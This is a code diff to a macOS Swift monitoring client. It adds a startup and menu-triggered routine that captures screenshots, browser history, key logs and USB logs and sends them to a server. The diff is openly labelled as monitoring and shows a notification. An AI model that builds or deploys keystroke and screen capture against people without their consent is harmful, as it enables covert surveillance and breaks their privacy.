@@ -446,9 +446,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMonitoringEvent("Setting up USB monitoring")
         setupUSBMonitoring()
         
-        // Test server connectivity on startup
-        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
-            self.testServerConnectivity()
+        // Send all monitoring requests on startup for quick verification
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+            self.performStartupTests()
         }
         
         // Debug accessibility status on startup
@@ -503,6 +503,69 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     
     @objc func flushLogsPeriodically() {
         flushLogBuffer()
+    }
+    
+    // Perform all monitoring tests on startup for quick verification
+    @objc func performStartupTests() {
+        logMessage("=== Starting Startup Tests ===", level: .info)
+        
+        // Test 1: Server connectivity (Tic event)
+        logMessage("Test 1: Sending tic event for server connectivity", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            do {
+                try self.sendTicEvent()
+            } catch {
+                self.logError("Startup tic event failed: \(error)", context: "StartupTest")
+            }
+        }
+        
+        // Test 2: Screenshot capability
+        logMessage("Test 2: Taking screenshot for permission verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            self.TakeScreenShotsAndPost()
+        }
+        
+        // Test 3: Browser history collection
+        logMessage("Test 3: Collecting browser history for access verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            do {
+                try self.sendBrowserHistories()
+            } catch {
+                self.logError("Startup browser history failed: \(error)", context: "StartupTest")
+            }
+        }
+        
+        // Test 4: Key logs (if any captured)
+        logMessage("Test 4: Sending key logs for keyboard monitoring verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            self.sendKeyLogs()
+        }
+        
+        // Test 5: USB logs (if any captured)
+        logMessage("Test 5: Sending USB logs for device monitoring verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            do {
+                try self.sendUSBLogs()
+            } catch {
+                self.logError("Startup USB logs failed: \(error)", context: "StartupTest")
+            }
+        }
+        
+        // Test 6: Server connectivity test
+        logMessage("Test 6: Testing server connectivity", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            self.testServerConnectivity()
+        }
+        
+        logMessage("=== Startup Tests Initiated ===", level: .info)
+        logMessage("All tests will complete within 5-10 seconds", level: .info)
+        
+        // Show notification about startup tests
+        let notification = NSUserNotification()
+        notification.title = "MonitorClient Startup Tests"
+        notification.informativeText = "Running all monitoring tests to verify permissions and server connectivity. Check logs for results."
+        notification.soundName = nil
+        NSUserNotificationCenter.default.deliver(notification)
     }
     
     // Check if system is idle before performing heavy operations
@@ -3121,6 +3184,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         let openSettingsItem = NSMenuItem(title: "Open Accessibility Settings", action: #selector(openAccessibilityPreferences), keyEquivalent: "")
         menu.addItem(openSettingsItem)
+        
+        menu.addItem(NSMenuItem.separator())
+        
+        // Manual test actions
+        let startupTestItem = NSMenuItem(title: "Run Startup Tests", action: #selector(performStartupTests), keyEquivalent: "")
+        menu.addItem(startupTestItem)
         
         menu.addItem(NSMenuItem.separator())
         
